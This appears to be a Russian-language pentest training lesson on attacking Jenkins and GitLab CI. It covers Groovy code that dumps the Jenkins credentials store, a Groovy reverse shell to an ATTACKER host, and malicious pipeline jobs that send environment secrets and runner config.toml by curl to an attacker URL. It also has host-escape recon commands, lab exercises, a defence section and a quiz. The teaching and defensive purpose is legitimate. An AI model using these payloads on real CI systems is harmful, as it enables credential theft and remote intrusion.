---
id: cloud-cicd-jenkins
title: "Jenkins и GitLab CI: эксплуатация CI/CD серверов"
category: cloud
parent: cloud-cicd-secrets
difficulty: hard
order: 3
tags: [cloud, jenkins, gitlab-ci, ci, rce, credentials, script-console]
prerequisites: [cloud-cicd-secrets, cloud-cicd-github-actions]
useful_for:
  - "Эксплуатация Jenkins/GitLab CI"
  - "Получение облачных кредов из CI"
  - "Пентест внутренней инфраструктуры"
estimated_minutes: 55
summary: "Как атаковать Jenkins и GitLab CI: script console, Groovy RCE, credentials store, GitLab runners и pipeline injection. Пути к облачным кредам и хосту."
---

Jenkins и GitLab CI — два самых распространённых self-hosted CI/CD. Оба имеют доступ к продакшену и облачным кредам, оба исторически полны RCE. Урок — практический: от обнаружения до извлечения кредов и захвата раннера.

## Jenkins: карта поверхности

Типовые эндпоинты и уязвимости:

| Точка | Риск |
|-------|------|
| `/script` (Script Console) | Groovy RCE |
| `/manage` | Управление плагинами/креденшелами |
| `/computer/(node)/script` | RCE на агенте |
| `/jnlpJars/` | Загрузка JNLP-агентов |
| `/cli` (remoting) | CLI RCE при слабой аутентификации |
| CVE-2024-23897 | Чтение файлов через CLI (args4j) |

```bash
# Обнаружение
nmap -Pn -p 8080,50000 --open <CIDR>
curl -s http://<host>:8080/login | grep -i jenkins
curl -s http://<host>:8080/api/json | jq '.jobs[].name'
```

## Groovy RCE через Script Console

Если `/script` доступен (или есть админ-доступ), выполняем Groovy:

```groovy
// Выполнение команды
def proc = "id".execute()
println(proc.text)

// Чтение credentials store
import com.cloudbees.plugins.credentials.*
import com.cloudbees.plugins.credentials.common.*
def creds = CredentialsProvider.lookupCredentials(
  StandardUsernamePasswordCredentials.class,
  Jenkins.instance, null, null)
creds.each { c -> println("${c.id}:${c.username}:${c.password}") }

// Secret text / строки
def texts = CredentialsProvider.lookupCredentials(
  org.jenkinsci.plugins.plaincredentials.StringCredentials.class,
  Jenkins.instance, null, null)
texts.each { t -> println("${t.id}:${t.secret}") }
```

Список задач и их параметров:

```bash
curl -s http://<host>:8080/api/json?tree=jobs[name,url]
curl -s http://<host>:8080/job/<job>/config.xml
```

## Jenkins: от анонимного доступа к RCE

Частые конфигурации:
- **Anonymous read** — доступ к `/api/json`, конфигам, иногда к `/script`.
- **Agent → master** — агент может подключиться к master и выполнить Groovy на нём.
- **Устаревшие плагины** — RCE-цепочки (Script Security bypass).

```bash
# Проверить анонимный доступ к script console
curl -s -o /dev/null -w '%{http_code}' http://<host>:8080/script
# Список плагинов и версий (для CVE)
curl -s http://<host>:8080/pluginManager/api/json?depth=1 | jq -r '.plugins[] | .shortName + ":" + .version'
```

## GitLab CI: runners и pipeline injection

GitLab-специфика:

- **Runner** — исполнитель job'ов; часто self-hosted, с доступом к сети и секретам.
- **CI/CD Variables** — секреты проекта/группы.
- **`CI_JOB_TOKEN`** — токен job'а, доступ к API и другим проектам.

```bash
# Логи job'а (могут светить секреты)
glab ci list -R group/project
glab ci trace <job-id>

# Переменные проекта
glab variable list -R group/project
```

Pipeline injection: если атакующий может править `.gitlab-ci.yml` в MR и job запускается с protected variables, он исполняет код с секретами.

```yaml
# Вредоносный job
evil:
  script:
    - env | base64 | curl -s --data-binary @- https://attacker/
```

## Разобранный пример: Jenkins → облачные креды

**Дано:** Jenkins с анонимным read и устаревшим плагином, дающим Groovy.

1. Читаем список job'ов и их конфиги:

```bash
curl -s http://<host>:8080/api/json?tree=jobs[name,url]
curl -s http://<host>:8080/job/deploy/config.xml | grep -iE 'aws|secret|token'
```

2. Выполняем Groovy через `/script` (или через RCE-плагин), читаем credentials store (команды выше).
3. Находим AWS-ключи, проверяем `aws sts get-caller-identity`.
4. Дальше — по дереву (см. `cloud-privesc-iam`).

## От CI-раннера к хосту

Self-hosted runner — это полноценный хост с доступом к сети. Захватив job, вы можете:

```bash
# Разведка окружения раннера
id; hostname; ip a; env | grep -iE 'aws|token|secret'
# Доступ к docker (часто смонтирован docker.sock)
ls -la /var/run/docker.sock
# Доступ к kubeconfig
find / -name "*.kubeconfig" -o -name "config" -path "*kube*" 2>/dev/null
```

## Частые ошибки

- **Игнорировать `/script`.** Даже при «анонимном read» он иногда открыт.
- **Забывать про агентов.** RCE на агенте может дать доступ к master.
- **Смотреть только секреты.** В конфигах job'ов бывают и креды, и пути к внутренним сервисам.
- **Путать `CI_JOB_TOKEN` и personal token.** У них разные права.
- **Не проверять плагины.** Устаревший плагин — частый RCE.
- **Не смотреть раннер как на хост.** Там docker.sock, kubeconfig, SSH-ключи.

## Что дальше / решение

- Есть `/script` или RCE → читайте credentials store.
- Есть анонимный read → читайте конфиги job'ов и плагины.
- Есть GitLab → смотрите переменные и раннеры.
- Смежные уроки: `cloud-cicd-secrets`, `cloud-cicd-github-actions`, `cloud-supply-chain`.

## Script Console и Groovy payloads

Jenkins Script Console (`/script`) выполняет Groovy от имени сервера:

```groovy
def p = "id".execute(); p.waitFor(); println p.text
// чтение креденшелов
def creds = Jenkins.instance.credentialsStore.getCredentials(...)
// реверс-шелл
["bash","-c","bash -i >& /dev/tcp/ATTACKER/4444 0>&1"].execute()
```

Проверка доступа: `curl -s http://TARGET:8080/script` — если 200 и нет аутентификации, это RCE.

## GitLab CI: runners и injection

- **Runner token** утекает в `.gitlab-ci.yml` или через `env`.
- **Pipeline injection**: изменение `.gitlab-ci.yml` в MR → выполнение на раннере.
- **Protected variables** не защищают от кода в том же репозитории.
- **Shared runners** могут иметь доступ к секретам проекта.

```yaml
stages: [test]
test:
  script: [ "curl -d @/etc/gitlab-runner/config.toml http://attacker/" ]
```

## От CI-раннера к хосту и облаку

Раннер часто имеет Docker-сокет (для сборки образов) → побег на хост. Плюс переменные с облачными креды (OIDC или static) → доступ в аккаунт. Проверяйте `/var/run/docker.sock`, `env`, `~/.aws/credentials`, `~/.config/gcloud`.

## Практическое задание

Поднимите Jenkins в Docker, включите анонимный доступ к `/script`, выполните `println "id".execute().text`. Затем добавьте credential (AWS-ключ) и извлеките его через Groovy. Оцените, как из этого получить облачный доступ. Для защиты — отключите анонимный `/script`, ограничьте права.

## Сравнение Jenkins и GitLab CI

| Аспект | Jenkins | GitLab CI |
|--------|---------|-----------|
| RCE-точка | Script Console (Groovy) | `.gitlab-ci.yml` на раннере |
| Анонимный доступ | часто к `/script` | редко |
| Секреты | credentials store | CI/CD variables |
| Побег на хост | плагины, агенты, docker.sock | docker.sock в раннере |
| Персистентность | job/cron, плагин | scheduled pipeline |

## Защита

- Jenkins: аутентификация, отключение `/script`, sandbox Groovy, обновление плагинов, изоляция агентов.
- GitLab: protected branches, защищённые переменные, отдельные runners для доверенных проектов, запрет MR-пайплайнов с секретами.
- Общее: не давать раннерам docker.sock и облачные креды без нужды; использовать OIDC вместо static-ключей.

## Практическое задание 2

В GitLab-проекте создайте переменную с «секретом», затем в MR измените `.gitlab-ci.yml`, чтобы она выводилась (`echo $SECRET`). Убедитесь, что пайплайн MR её не показывает, если включены protected variables, и показывает, если нет. Это демонстрирует, как конфигурация CI определяет утечку секретов.

## Плагины как поверхность атаки

Jenkins-плагины имеют доступ к серверу и часто уязвимы (deserialization, SSRF, RCE). Проверьте версии и известные CVE плагинов: `/pluginManager/api/json?tree=plugins[shortName,version]`. Устаревший плагин с публичным эксплойтом — прямой путь к RCE даже без Script Console. Обновляйте плагины и удаляйте неиспользуемые.

## Быстрая проверка Jenkins

```bash
curl -s http://TARGET:8080/api/json?tree=jobs[name]
curl -s http://TARGET:8080/script
curl -s http://TARGET:8080/pluginManager/api/json?tree=plugins[shortName,version]
```

Открытый `/script` = RCE. Доступ к API без auth раскрывает джобы и креды. Устаревшие плагины — дополнительный вектор. Начинайте с этих трёх запросов.

## Квиз

```quiz
- question: "Какой эндпоинт Jenkins даёт Groovy RCE?"
  options:
    - "/script (Script Console)"
    - "/login"
    - "/favicon.ico"
    - "/robots.txt"
  answer: 0
  explanation: "Script Console выполняет произвольный Groovy."
- question: "Где Jenkins хранит креды для job'ов?"
  options:
    - "В credentials store (доступен через Groovy/плагины)"
    - "В README"
    - "В git-логе"
    - "В /etc/hosts"
  answer: 0
  explanation: "CredentialsProvider отдаёт секреты через API/Groovy."
- question: "Что такое GitLab runner?"
  options:
    - "Исполнитель job'ов, часто self-hosted с доступом к сети и секретам"
    - "Тип merge request"
    - "Формат .gitlab-ci.yml"
    - "Плагин Jenkins"
  answer: 0
  explanation: "Раннер исполняет пайплайн и имеет доступ к окружению."
- question: "Почему self-hosted раннер опасен при компрометации?"
  options:
    - "Это полноценный хост с docker.sock, kubeconfig и SSH-ключами"
    - "Он всегда изолирован"
    - "У него нет сети"
    - "Он не хранит секреты"
  answer: 0
  explanation: "Раннер — доверенный узел внутри периметра."
- question: "Какой класс уязвимостей часто даёт RCE в Jenkins?"
  options:
    - "Устаревшие плагины и Script Security bypass"
    - "Неверный часовой пояс"
    - "Медленный диск"
    - "Старый браузер"
  answer: 0
  explanation: "Плагины — основной источник RCE-цепочек."
```

## Где пригодится

- **Пентест:** эксплуатация Jenkins/GitLab в корпоративной сети.
- **Red team:** от CI к облачным кредам и хосту.
- **CTF:** задачи с CI/CD.
- **Работа/DevSecOps:** обновление плагинов, изоляция раннеров, protected variables.
- **Дальше по дереву:** `cloud-cicd-secrets`, `cloud-privesc-iam`.
